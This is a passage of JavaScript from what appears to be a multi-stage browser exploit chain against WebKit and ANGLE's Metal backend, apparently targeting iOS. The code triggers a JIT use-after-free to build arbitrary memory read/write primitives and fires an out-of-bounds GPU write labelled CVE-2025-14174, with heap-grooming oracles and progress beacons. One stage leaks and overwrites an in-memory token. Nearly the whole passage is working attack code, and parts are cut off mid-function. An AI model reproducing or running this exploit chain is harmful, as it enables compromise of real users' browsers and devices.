        `=== RESULTS ===\n${resultsDiv.innerText || ''}`.trim(),

    let copied = false;
    if (navigator.clipboard && window.isSecureContext) {
        try {
            await navigator.clipboard.writeText(text);
            copied = true;
        } catch (e) {
            // Fallback below
        }

    if (!copied) {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.cssText = 'position:fixed;left:-9999px;top:0;';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        ta.setSelectionRange(0, ta.value.length);
        copied = document.execCommand('copy');
        document.body.removeChild(ta);

    if (!copied) {
        showManualCopyPanel(text);

    const btn = buttonEl || document.getElementById('copyOutputBtn');

function fnv1a32(bytes) {
    let hash = 0x811c9dc5;
    for (let i = 0; i < bytes.length; i++) {
        hash ^= bytes[i];
        hash = Math.imul(hash, 0x01000193) >>> 0;
    }
    return hash >>> 0;
}

function makePatternU8(length, seed) {
    const out = new Uint8Array(length);
    let x = seed >>> 0;
    for (let i = 0; i < out.length; i++) {
        x = (Math.imul(x, 1664525) + 1013904223) >>> 0;
        out[i] = x & 0xff;
    }
    return out;
}

function makePatternF32(length, seed) {
    const out = new Float32Array(length);
    let x = seed >>> 0;
    for (let i = 0; i < out.length; i++) {
        x = (Math.imul(x, 1103515245) + 12345) >>> 0;
        out[i] = ((x >>> 8) & 0xffff) / 65535.0;
    }
    return out;
}

function ensureGL2Context() {
    const getCtx = (canvas) => (
        canvas.getContext('webgl2', { antialias: false, preserveDrawingBuffer: true, powerPreference: 'high-performance' })
        || canvas.getContext('experimental-webgl2')
    );

    let canvas = document.getElementById('glCanvas');
    if (!canvas) {
        return null;
    }
    let gl = getCtx(canvas);
    if (gl && !gl.isContextLost()) {
        return gl;
    }

    // Recover from stale/lost context by replacing the canvas node.
    const replacement = document.createElement('canvas');
    replacement.id = 'glCanvas';
    replacement.width = canvas.width || 1024;
    replacement.height = canvas.height || 1024;
    replacement.style.cssText = canvas.style.cssText;
    canvas.replaceWith(replacement);
    canvas = replacement;
    gl = getCtx(canvas);
    return gl;
}

function readTextureHash(gl, fb, texture, width, height, scratch) {
    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
    const status = gl.checkFramebufferStatus(gl.FRAMEBUFFER);
    if (status !== gl.FRAMEBUFFER_COMPLETE) {
        return { ok: false, hash: 0, status };
    }
    gl.readPixels(0, 0, width, height, gl.RGBA, gl.UNSIGNED_BYTE, scratch);
    return { ok: true, hash: fnv1a32(scratch), status };
}

function readPBOHash(gl, pbo, byteLength, scratch) {
    if (!scratch || scratch.byteLength < byteLength) {
        scratch = new Uint8Array(byteLength);
    }
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
    gl.getBufferSubData(gl.PIXEL_UNPACK_BUFFER, 0, scratch, 0, byteLength);
    return fnv1a32(scratch.subarray(0, byteLength));
}

function snapshotGPUCanaries(gl, harness) {
    const textureHashes = [];
    const pboHashes = [];

    if (!harness.disableTextureCanaries) {
        for (const texInfo of harness.textureCanaries) {
            const result = readTextureHash(gl, harness.fb, texInfo.texture, texInfo.width, texInfo.height, harness.textureScratch);
            if (!result.ok) {
                return { ok: false, error: `FBO incomplete: 0x${result.status.toString(16)}` };
            }
            textureHashes.push(result.hash);
        }
    }

    for (const pboInfo of harness.pboCanaries) {
        const hash = readPBOHash(gl, pboInfo.pbo, pboInfo.size, harness.pboScratch);
        pboHashes.push(hash);
    }

    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);

    return { ok: true, textureHashes, pboHashes };
}

function diffGPUCanaries(baseline, current) {
    const textureMismatches = [];
    const pboMismatches = [];

    for (let i = 0; i < baseline.textureHashes.length; i++) {
        if (baseline.textureHashes[i] !== current.textureHashes[i]) {
            textureMismatches.push(i);
        }
    }
    for (let i = 0; i < baseline.pboHashes.length; i++) {
        if (baseline.pboHashes[i] !== current.pboHashes[i]) {
            pboMismatches.push(i);
        }
    }

    return {
        textureMismatches,
        pboMismatches,
        changed: textureMismatches.length > 0 || pboMismatches.length > 0,
    };
}

function setupGPUCanaryHarness(gl) {
    const harness = {
        fb: gl.createFramebuffer(),
        textureCanaries: [],
        pboCanaries: [],
        textureScratch: new Uint8Array(96 * 96 * 4),
        pboScratch: new Uint8Array(0x4000),
        baseline: null,
        attackTexture: null,
        disableTextureCanaries: false,
    };

    // Texture canaries (GPU texture memory oracle)
    for (let i = 0; i < 8; i++) {
        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
        const width = 96;
        const height = 96;
        const data = makePatternU8(width * height * 4, 0xA000 + i);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
        harness.textureCanaries.push({ texture: tex, width, height });
    }
    gl.bindTexture(gl.TEXTURE_2D, null);

    // PBO canaries (GPU buffer memory oracle)
    for (let i = 0; i < 16; i++) {
        const pbo = gl.createBuffer();
        const data = makePatternU8(0x4000, 0xB000 + i);
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, data, gl.DYNAMIC_DRAW);
        harness.pboCanaries.push({ pbo, size: data.byteLength });
    }
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);

    let snapshot = snapshotGPUCanaries(gl, harness);
    if (!snapshot.ok) {
        // Some Safari/Metal paths reject texture readback FBO setup. Keep PBO oracles enabled.
        harness.disableTextureCanaries = true;
        snapshot = snapshotGPUCanaries(gl, harness);
    }
    if (!snapshot.ok) {
        throw new Error(`Failed to capture baseline canaries: ${snapshot.error}`);
    }
    harness.baseline = snapshot;

    return harness;
}

function createHeapPBOOracle(gl, allocSize, seed, guardCount = 24) {
    const oracle = {
        allocSize,
        guards: [],
        scratch: new Uint8Array(allocSize),
    };

    for (let i = 0; i < guardCount; i++) {
        const pbo = gl.createBuffer();
        const data = makePatternU8(allocSize, seed + i * 0x101);
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, data, gl.DYNAMIC_DRAW);
        oracle.guards.push({
            pbo,
            expectedHash: fnv1a32(data),
            freed: false,
            index: i,
        });
    }
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
    return oracle;
}

function punchHeapPBOHoles(gl, oracle, mode = 0) {
    const freed = [];
    for (let i = 0; i < oracle.guards.length; i++) {
        let freeThis = false;
        if (mode === 0) {
            freeThis = (i % 3) === 1;
        } else if (mode === 1) {
            freeThis = (i % 2) === 1;
        } else {
            freeThis = (i % 4) >= 2;
        }
        if (!freeThis) {
            continue;
        }
        const guard = oracle.guards[i];
        if (!guard.freed && guard.pbo) {
            gl.deleteBuffer(guard.pbo);
            guard.freed = true;
            freed.push(i);
        }
    }
    return freed;
}

function scanHeapPBOOracle(gl, oracle) {
    const mismatches = [];
    for (const guard of oracle.guards) {
        if (guard.freed || !guard.pbo) {
            continue;
        }
        let hash = 0;
        try {
            hash = readPBOHash(gl, guard.pbo, oracle.allocSize, oracle.scratch);
        } catch (e) {
            mismatches.push({
                index: guard.index,
                reason: `read-failed:${e.message}`,
                expectedHash: guard.expectedHash,
                actualHash: 0,
            });
            continue;
        }
        if (hash !== guard.expectedHash) {
            mismatches.push({
                index: guard.index,
                reason: 'hash-mismatch',
                expectedHash: guard.expectedHash,
                actualHash: hash,
            });
        }
    }
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
    return {
        changed: mismatches.length > 0,
        mismatches,
    };
}

function destroyHeapPBOOracle(gl, oracle) {
    if (!oracle) return;
    for (const guard of oracle.guards) {
        if (guard.pbo) {
            gl.deleteBuffer(guard.pbo);
            guard.pbo = null;
            guard.freed = true;
        }
    }
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
}

function triggerANGLEWithHeapOracle(gl, cfg, seed) {
    const rowPitch = cfg.width * 4;
    const allocSize = rowPitch * cfg.unpackImageHeight;
    const guardCount = cfg.guardCount || 24;
    const holeMode = cfg.holeMode || 0;
    const oracle = createHeapPBOOracle(gl, allocSize, seed ^ 0x9E370001, guardCount);
    const freed = punchHeapPBOHoles(gl, oracle, holeMode);
    let triggerResult;
    let scanResult = { changed: false, mismatches: [] };

    try {
        gl.finish();
        triggerResult = triggerANGLEDepthOOB(gl, cfg, seed);
        if (!triggerResult.contextLost) {
            gl.finish();
            scanResult = scanHeapPBOOracle(gl, oracle);
        }
    } finally {
        destroyHeapPBOOracle(gl, oracle);
    }

    return {
        allocSize,
        freed,
        triggerResult,
        scanResult,
    };
}

const CONFIG = {
    JIT_WARMUP_ITERATIONS: 1000,      // Iterations to trigger DFG compilation
    RECURSIVE_WARMUP_DEPTH: 800,      // Stack clearing warmup depth (will overflow safely)
    MAX_EXPLOIT_ATTEMPTS: 15000,      // Outer loop attempts (increased)
    RECURSIVE_CLEAR_DEPTH: 800,       // Stack clear depth per call (overflow is OK)
    SPRAY_ARRAYS_PER_ATTEMPT: 64,     // Arrays to spray per attempt (increased from 16)
    ALLOCBUFFER_COUNT_MOD: 5,         // Modulo for ArrayBuffer allocation variance
    INNER_LOOP_K: 10,                 // Inner timing loop k value
};

// Core trigger function - directly from working exp.html
// This function must be JIT compiled for the bug to manifest
function triggerUAF(flag, k, allocCount) {
    // Object A will be stored in old space via the large uafArray
    let A = {
        p0: 0x41414141,
        p1: 1.1,
        p2: 2.2,
    };
    uafArray[uafArrayIndex] = A;  // A now reachable from old space

    let forGC = [];

    // Create Date 'a' - the target that will be freed
    // CRITICAL: a[0] = 1.1 creates a BUTTERFLY for the Date object
    // This butterfly is NOT in IsoSubspace - it's in regular heap
    // When 'a' is freed, its butterfly can be reclaimed by other allocations
    let a = new Date(1111);
    a[0] = 1.1;  // Creates butterfly for Date - THIS IS THE KEY!

    // Allocate large ArrayBuffers to trigger full GC
    // Full GC is needed to scan old space where A lives
    for (let j = 0; j < allocCount; ++j) {
        let buf = new ArrayBuffer(0x800000);  // 8MB each
        forGC.push(buf);
    }

    // Store forGC in A to keep references alive and ensure A gets scanned
    A.p2 = forGC;

    // Object 'b' - created in eden, will hold dangling reference to 'a'
    let b = {
        p0: 0x42424242,
        p1: 1.1,
    };

    // Create Phi node - this is where the bug manifests
    // DFG will see: f = Phi(b, 1.1)
    // When f escapes via A.p1 = f, DFG marks the Phi as escaped
    // BUT it fails to mark the Upsilon inputs (b) as escaped
    let f;
    f = b;
    if (flag) {
        f = 1.1;
    }

    // A.p1 = f makes Phi escape
    // GC can now reach 'f' (and thus 'b') through old space object A
    // But DFG doesn't know 'b' escaped, so no barrier on 'b' stores
    A.p1 = f;

    // Long loop to create race window
    // This lets GC mark A and b (via the escaped Phi path)
    // We need A and b to be marked Black before we store 'a' into b
    let v = 1.1;
    for (let i = 0; i < 1e6; ++i) {
        for (let j = 0; j < k; ++j) {
            v = i;
            v = j;
        }
    }

    // Store result to prevent loop optimization
    b.p0 = v;

    // THE VULNERABILITY: b.p1 = a without write barrier!
    // - 'b' is Black (already marked by GC via A -> f -> b path)
    // - 'a' is White (eden object, not yet marked)
    // - This creates Black -> White edge
    // - Without barrier, GC doesn't rescan 'b', never sees 'a'
    // - 'a' stays White and gets collected = UAF!
    b.p1 = a;
}

// Clear stack of butterfly pointers
// During butterfly allocation, pointers get written to the stack.
// Conservative stack scanning by GC can find these and prevent collection.
// This recursive function overwrites stack memory with call frames.
function recursive(n) {
    if (n === 0) return;
    n = n | 0;
    recursive(n - 1);
}

// Safe recursive call that handles stack overflow
function safeRecursive(depth) {
    try {
        recursive(depth);
    } catch (e) {
        // Stack overflow - that's actually good, we filled the stack
    }
}

// Alternative stack clearing using multiple shallower calls
function clearStack() {
    for (let i = 0; i < 50; i++) {
        safeRecursive(CONFIG.RECURSIVE_CLEAR_DEPTH);
    }
}

                        boxed_arr[0] = preAllocatedTargets.testObject;
                        return bits;
                    }
                    // Primitive JSValues that don't map cleanly to number/object are not
                    // currently representable by this primitive path.
                    return 0x7ff8000000000000n;
                };

                // write64(addr, val) - write 8 bytes at addr
                exploitState.write64 = function(addr, val) {
                    unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
                    const fake = boxed_arr[0];
                    fake.slot0 = itof(val);
                };

                exploitState.stablePrimitivesReady = true;
            } else {

            // Also verify fakeobj works with Float64Array

// =============================================================================
// STAGE 3: ANGLE OOB Write (CVE-2025-14174)
// =============================================================================
//
// The bug: In ANGLE's Metal backend, when uploading D32F depth textures
// via PBO, the staging buffer is sized using UNPACK_IMAGE_HEIGHT instead
// of actual texture height. When UNPACK_IMAGE_HEIGHT < height, this causes
// an undersized allocation followed by OOB write.
//
// Trigger:
// 1. Create WebGL2 context
// 2. Create PBO with depth data
// 3. Set UNPACK_IMAGE_HEIGHT < actual height
// 4. Upload D32F texture via texImage2D from PBO
// 5. OOB write = rowPitch * (height - UNPACK_IMAGE_HEIGHT)
// =============================================================================

async function runStage3() {
    log('\n========================================', 'stage3');
    log('STAGE 3: ANGLE OOB Trigger + GPU Oracles', 'stage3');
    log('========================================', 'stage3');
    log('Goal: Trigger setSubImageImpl OOB path and check heap-oracle + baseline GPU canaries', 'info');
    beaconEvent('stage3_start', 'runStage3');

    await new Promise(r => setTimeout(r, 10));

    let gl = exploitState.gl || ensureGL2Context();
    if (!gl || gl.isContextLost()) {
        log('WebGL2 unavailable or context lost; reinitializing Stage 2 context', 'warn');
        exploitState.stage2Complete = false;
        exploitState.gpuHarness = null;
        const recovered = await runStage2();
        gl = exploitState.gl;
        if (!recovered || !gl || gl.isContextLost()) {
            log('WebGL2 unavailable or context already lost', 'fail');
            beaconEvent('stage3_fail', 'no_context_or_lost');
            return false;
        }
    }

    if (!exploitState.stage2Complete || !exploitState.gpuHarness) {
        log('Stage 2 harness not ready - initializing now', 'info');
        const ok = await runStage2();
        if (!ok || !exploitState.gpuHarness) {
            log('Failed to initialize GPU harness', 'fail');
            beaconEvent('stage3_fail', 'stage2_harness_unavailable');
            return false;
        }
    }

    evidence.gpuCanaryCorruption = false;
    evidence.gpuHeapCorruption = false;
    evidence.gpuContextLost = false;
    evidence.angleCorruptionDetected = false;
    exploitState.gpuTriggerAttempts = 0;
    exploitState.gpuHeapCorruptions = 0;
    exploitState.lastGpuHeapHit = null;

    try {
        const attempts = [
            { width: 1024, height: 2048, unpackImageHeight: 1, useSubImage: false, guardCount: 48, holeMode: 0 },
            { width: 1536, height: 2048, unpackImageHeight: 1, useSubImage: true, guardCount: 64, holeMode: 1 },
            { width: 2048, height: 2048, unpackImageHeight: 1, useSubImage: false, guardCount: 64, holeMode: 2 },
            { width: 2048, height: 3072, unpackImageHeight: 1, useSubImage: true, guardCount: 80, holeMode: 0 },
            { width: 3072, height: 3072, unpackImageHeight: 1, useSubImage: false, guardCount: 96, holeMode: 1 },
        ];

        let anyTriggered = false;
        let maxOob = 0;
        const harness = exploitState.gpuHarness;
        const rounds = 4;
        const stage3StartMs = performance.now();
        const stage3BudgetMs = 7000;
        let budgetExpired = false;

        for (let round = 0; round < rounds; round++) {
            log(`Round ${round + 1}/${rounds}`, 'info');

            for (let i = 0; i < attempts.length; i++) {
                if ((performance.now() - stage3StartMs) >= stage3BudgetMs) {
                    budgetExpired = true;
                    log(`Stage 3 budget exhausted at ${Math.round(performance.now() - stage3StartMs)}ms`, 'warn');
                    break;
                }
                const cfg = attempts[i];
                const globalAttempt = round * attempts.length + i;
                const oracleResult = triggerANGLEWithHeapOracle(gl, cfg, 0x6000 + globalAttempt * 0x211);
                const result = oracleResult.triggerResult;
                exploitState.gpuTriggerAttempts++;
                maxOob = Math.max(maxOob, result.oobWriteSize);

                log(
                    `Attempt ${globalAttempt + 1}: ${cfg.width}x${cfg.height}, UNPACK_IMAGE_HEIGHT=${cfg.unpackImageHeight}, mode=${cfg.useSubImage ? 'texSubImage2D' : 'texImage2D'}`,
                    'info'
                );
                log(`  Estimated OOB size: ${result.oobWriteSize} bytes`, 'critical');
                log(`  Heap oracle allocSize=${oracleResult.allocSize}, freed=${oracleResult.freed.length}`, 'info');

                anyTriggered = true;
                evidence.angleTriggered = true;
                if (result.err !== gl.NO_ERROR && !result.contextLost) {
                    log(`  GL error: 0x${result.err.toString(16)}`, 'warn');
                }

                if (result.contextLost) {
                    exploitState.gpuContextLost = true;
                    evidence.gpuContextLost = true;
                    log('  Context lost during trigger - GPU process instability observed', 'critical');
                    beaconEvent('stage3_hit', `type=context_lost;attempt=${globalAttempt + 1}`);
                    break;
                }

                if (oracleResult.scanResult.changed) {
                    evidence.gpuHeapCorruption = true;
                    evidence.angleCorruptionDetected = true;
                    exploitState.gpuHeapCorruptions++;
                    exploitState.lastGpuHeapHit = {
                        attempt: globalAttempt + 1,
                        config: cfg,
                        mismatches: oracleResult.scanResult.mismatches,
                    };
                    const idxSummary = oracleResult.scanResult.mismatches.map(m => m.index).join(', ');
                    log(`  Heap-oracle corruption detected! guard_indexes=[${idxSummary}]`, 'critical');
                    for (const mismatch of oracleResult.scanResult.mismatches.slice(0, 4)) {
                        log(
                            `  guard[${mismatch.index}] ${mismatch.reason} expected=0x${mismatch.expectedHash.toString(16)} actual=0x${mismatch.actualHash.toString(16)}`,
                            'critical'
                        );
                    }
                    beaconEvent('stage3_hit', `type=heap_oracle;attempt=${globalAttempt + 1};mismatches=${oracleResult.scanResult.mismatches.length}`);
                    break;
                }

                const snapshot = snapshotGPUCanaries(gl, harness);
                if (!snapshot.ok) {
                    log(`  Canary snapshot failed: ${snapshot.error}`, 'warn');
                } else {
                    const diff = diffGPUCanaries(harness.baseline, snapshot);
                    if (diff.changed) {
                        evidence.gpuCanaryCorruption = true;
                        evidence.angleCorruptionDetected = true;
                        log(`  GPU canary corruption detected! textures=${diff.textureMismatches.length}, pbos=${diff.pboMismatches.length}`, 'critical');
                        if (diff.textureMismatches.length) {
                            log(`  Texture canary indexes: ${diff.textureMismatches.join(', ')}`, 'critical');
                        }
                        if (diff.pboMismatches.length) {
                            log(`  PBO canary indexes: ${diff.pboMismatches.join(', ')}`, 'critical');
                        }
                        beaconEvent('stage3_hit', `type=canary;attempt=${globalAttempt + 1};tex=${diff.textureMismatches.length};pbo=${diff.pboMismatches.length}`);
                        break;
                    }
                }

                await new Promise(r => setTimeout(r, 20));
            }

            if (evidence.angleCorruptionDetected || evidence.gpuContextLost) {
                break;
            }
            if (budgetExpired) {
                break;
            }
            await new Promise(r => setTimeout(r, 50));
        }

        exploitState.angleTriggered = anyTriggered;
        exploitState.oobWriteSize = maxOob;
        exploitState.stage3Complete = true;

        if (!evidence.angleCorruptionDetected && !evidence.gpuContextLost) {
            log('No heap-oracle or baseline-canary mismatch observed in this run', 'warn');
        }

        log(
            `STAGE 3 COMPLETE: attempts=${exploitState.gpuTriggerAttempts}, max_oob=${maxOob}, heap_hits=${exploitState.gpuHeapCorruptions}`,
            'stage3'
        );
        beaconEvent('stage3_end', `attempts=${exploitState.gpuTriggerAttempts};max_oob=${maxOob};evidence=${evidence.angleCorruptionDetected ? 1 : 0};ctxlost=${evidence.gpuContextLost ? 1 : 0};budget=${budgetExpired ? 1 : 0}`);
        return anyTriggered;

    } catch (e) {
        log(`Stage 3 exception: ${e.message}`, 'fail');
        log('Exception observed while executing ANGLE trigger path', 'critical');
        evidence.angleTriggered = true;
        evidence.gpuContextLost = gl.isContextLost();
        evidence.angleCorruptionDetected = evidence.gpuContextLost;
        exploitState.gpuContextLost = evidence.gpuContextLost;
        exploitState.angleTriggered = true;
        exploitState.stage3Complete = true;
        beaconEvent('stage3_fail', `exception=${(e.message || 'unknown').slice(0, 120)}`);
        return true;
    }
}

function resetUnpackState(gl) {
    gl.pixelStorei(gl.UNPACK_ALIGNMENT, 4);
    gl.pixelStorei(gl.UNPACK_ROW_LENGTH, 0);
    gl.pixelStorei(gl.UNPACK_SKIP_PIXELS, 0);
    gl.pixelStorei(gl.UNPACK_SKIP_ROWS, 0);
    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 0);
    gl.pixelStorei(gl.UNPACK_SKIP_IMAGES, 0);
}

function triggerANGLEDepthOOB(gl, cfg, seed) {
    const width = cfg.width;
    const height = cfg.height;
    const unpackImageHeight = cfg.unpackImageHeight;
    const useSubImage = cfg.useSubImage;

    const rowPitch = width * 4; // DEPTH_COMPONENT/FLOAT
    const allocatedSize = rowPitch * unpackImageHeight;
    const actualWriteSize = rowPitch * height;
    const oobWriteSize = Math.max(0, actualWriteSize - allocatedSize);
    const sourceBytes = rowPitch * height;

    // IDA verification (iOS 26.1 dyld cache):
    // - GL_PixelStorei_0: pname 0x806E writes ctx+0x2D9C
    // - gl::Context::texImage2D passes PixelUnpackState at ctx+0x2D8C
    // - rx::TextureMtl::setSubImageImpl reads [PixelUnpackState + 0x10]
    // Therefore [a7 + 0x10] == UNPACK_IMAGE_HEIGHT in the vulnerable path.

    const pbo = gl.createBuffer();
    const texture = gl.createTexture();
    let err = gl.NO_ERROR;
    let contextLost = false;

    try {
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
        // Keep memory pressure manageable for large trigger profiles.
        // ANGLE path only needs a correctly-sized PBO allocation.
        if (sourceBytes <= 0x200000) {
            const pboData = makePatternF32(width * height, seed);
            gl.bufferData(gl.PIXEL_UNPACK_BUFFER, pboData, gl.STATIC_DRAW);
        } else {
            gl.bufferData(gl.PIXEL_UNPACK_BUFFER, sourceBytes, gl.STATIC_DRAW);
        }

        gl.bindTexture(gl.TEXTURE_2D, texture);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);

        resetUnpackState(gl);
        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, unpackImageHeight);

        if (useSubImage) {
            gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, null);
            gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
            gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, width, height, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
        } else {
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
        }

        err = gl.getError();
        gl.finish();
        contextLost = gl.isContextLost();
    } finally {
        resetUnpackState(gl);
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
        gl.bindTexture(gl.TEXTURE_2D, null);
        if (texture) gl.deleteTexture(texture);
        if (pbo) gl.deleteBuffer(pbo);
    }

    return { err, contextLost, oobWriteSize };
}

// =============================================================================
// STAGE 4: Chain Integration Gate
// =============================================================================
//
// Stage 4 marks the chain as "ready" only when BOTH conditions hold:
//   1) WebKit renderer primitive evidence (addrof + fakeobj)
//   2) GPU-process evidence (canary corruption or context loss after ANGLE path)
// =============================================================================

async function runStage4() {
    log('\n========================================', 'stage3');
    log('STAGE 4: Chain Integration Gate', 'stage3');
    log('========================================', 'stage3');

    const rendererPrims = evidence.addrofWorks && evidence.fakeobjWorks;
    const gpuEvidence = evidence.angleCorruptionDetected || evidence.gpuContextLost;
    const angleExecuted = evidence.angleTriggered;

    log(`Renderer primitives: ${rendererPrims ? 'READY' : 'NOT READY'}`, rendererPrims ? 'success' : 'warn');
    log(`ANGLE path executed: ${angleExecuted ? 'YES' : 'NO'}`, angleExecuted ? 'success' : 'warn');
    log(`GPU evidence: ${gpuEvidence ? 'PRESENT' : 'ABSENT'}`, gpuEvidence ? 'critical' : 'warn');
    log(`  heap-oracle=${evidence.gpuHeapCorruption ? 'hit' : 'none'}, canary=${evidence.gpuCanaryCorruption ? 'hit' : 'none'}, context_lost=${evidence.gpuContextLost ? 'yes' : 'no'}`, gpuEvidence ? 'critical' : 'warn');

    if (!rendererPrims && exploitState.stage1Complete) {
        log('Stage 1 ran but did not preserve stable primitive evidence in this run', 'warn');
    }
    if (!gpuEvidence && exploitState.stage3Complete) {
        log('Stage 3 ran but no canary mismatch/context-loss was observed', 'warn');
    }

    evidence.chainReady = rendererPrims && angleExecuted && gpuEvidence;
    exploitState.stage4Complete = true;

    if (evidence.chainReady) {
        log('CHAIN READY: Renderer + GPU-process evidence captured in one run', 'critical');
    } else {
        log('CHAIN NOT READY: Missing either renderer primitives or GPU-process evidence', 'warn');
    }

    logEvidenceSummary();
    return evidence.chainReady;
}

// =============================================================================
// STAGE 5: Live In-Process Read/Write Proof
// =============================================================================
//
// Demonstrates practical post-primitive impact in-process on a live object:
// 1) leak a secret token from raw memory using read64(addr)
// 2) mutate that token in memory using write64(addr, val)
// =============================================================================

async function runStage5() {
    log('\n========================================', 'stage3');
    log('STAGE 5: Live In-Process R/W Proof', 'stage3');
    log('========================================', 'stage3');
    beaconEvent('stage5_start', 'runStage5');

    if (!exploitState.stablePrimitivesReady ||
        typeof exploitState.read64 !== 'function' ||
        typeof exploitState.write64 !== 'function' ||
        typeof exploitState.addrof !== 'function') {
        log('Stage 5 failed: stable read64/write64 primitives unavailable', 'fail');
        beaconEvent('stage5_end', 'read=0;write=0;reason=no_primitives');
        return false;
    }

    try {
        const CANONICAL_NAN = 0x7ff8000000000000n;
        const SLOT0_OFF = 0x10n;
        const staleStage1Addr = exploitState.leakedAddresses?.stage5Probe || 0n;

        // Rotate the secret each run so stale reads cannot accidentally pass.
        const nonce = BigInt((Date.now() ^ ((Math.random() * 0x100000000) >>> 0)) & 0xffff);
        let secretWord = (0x1122334455660000n | nonce) ^ 0x55aan;
        if (((secretWord >> 48n) & 0xffffn) === 0x7ff8n || secretWord === 0n) {
            secretWord ^= 0x0100000000000001n;
        }
        stage5Probe.slot0 = itof(secretWord);

        const jsBefore = ftoi(stage5Probe.slot0);
        const addrofProbe = exploitState.addrof(stage5Probe);
        const candidateAddrs = [];
        if (addrofProbe !== 0n && addrofProbe !== CANONICAL_NAN) {
            candidateAddrs.push({ source: 'addrof', addr: addrofProbe });
        }
        if (staleStage1Addr !== 0n && staleStage1Addr !== CANONICAL_NAN) {
            candidateAddrs.push({ source: 'stage1_leak', addr: staleStage1Addr });
        }
        if (candidateAddrs.length === 0) {
            throw new Error('no_stage5_candidates');
        }

        let selected = null;
        const candidateNotes = [];
        for (let i = 0; i < candidateAddrs.length; i++) {
            const c = candidateAddrs[i];
            let v = 0n;
            try {
                v = exploitState.read64(c.addr + SLOT0_OFF);
            } catch (_) {
                v = 0n;
            }
            const ok = (v === jsBefore) && (v !== CANONICAL_NAN);
            candidateNotes.push(`${c.source}@0x${c.addr.toString(16)}=0x${v.toString(16)}:${ok ? 'ok' : 'bad'}`);
            if (ok && selected === null) {
                selected = { source: c.source, addr: c.addr, baseline: v };
            }
        }
        if (selected === null) {
            throw new Error(`no_live_address_${encodeURIComponent(candidateNotes.join('|').slice(0, 220))}`);
        }

        const liveAddr = selected.addr;
        const slot0Addr = liveAddr + SLOT0_OFF;
        const baselineWord = selected.baseline;

        let writeMarkerWord = secretWord ^ 0x00ff00aa55aa00ffn;
        if (writeMarkerWord === secretWord) {
            writeMarkerWord ^= 0x1111n;
        }
        if (((writeMarkerWord >> 48n) & 0xffffn) === 0x7ff8n || writeMarkerWord === 0n) {
            writeMarkerWord ^= 0x0100000000000000n;
        }

        exploitState.write64(slot0Addr, writeMarkerWord);
        const markerRead = exploitState.read64(slot0Addr);
        const jsMarker = ftoi(stage5Probe.slot0);

        exploitState.write64(slot0Addr, secretWord);
        const restoreRead = exploitState.read64(slot0Addr);
        const jsRestore = ftoi(stage5Probe.slot0);

        const baselineMatches = (baselineWord === secretWord) && (baselineWord === jsBefore) && (baselineWord !== CANONICAL_NAN);
        const markerMatches = (markerRead === writeMarkerWord) && (jsMarker === writeMarkerWord);
        const restoreMatches = (restoreRead === secretWord) && (jsRestore === secretWord);
        const readOk = baselineMatches && restoreMatches;
        const writeOk = markerMatches && restoreMatches;
        const movedFromStage1 = (staleStage1Addr !== 0n) && (staleStage1Addr !== liveAddr);
        const leakedToken = `0x${baselineWord.toString(16)}`;

        evidence.sensitiveDataRead = readOk && writeOk;
        evidence.arbRWWorks = evidence.arbRWWorks || (readOk && writeOk);
        exploitState.leakedSensitive = leakedToken;
        exploitState.stage5Complete = readOk && writeOk;

        log(`Stage5 probe base: 0x${liveAddr.toString(16)} (slot0=+0x10)`, 'critical');
        log(`Stage5 source: ${selected.source}`, 'info');
        log(`Stage5 candidates: ${candidateNotes.join(' | ')}`, 'info');
        if (staleStage1Addr !== 0n) {
            log(`Stage5 addr drift vs Stage1 leak: ${movedFromStage1 ? 'YES' : 'NO'} (stage1=0x${staleStage1Addr.toString(16)})`, movedFromStage1 ? 'warn' : 'success');
        }
        log(`Sensitive token leaked via read64: ${readOk ? 'YES' : 'NO'}`, readOk ? 'critical' : 'warn');
        if (readOk) {
            log(`Leaked token: ${leakedToken}`, 'critical');
        }
        log(`Sensitive token overwritten via write64: ${writeOk ? 'YES' : 'NO'}`, writeOk ? 'critical' : 'warn');
        log(
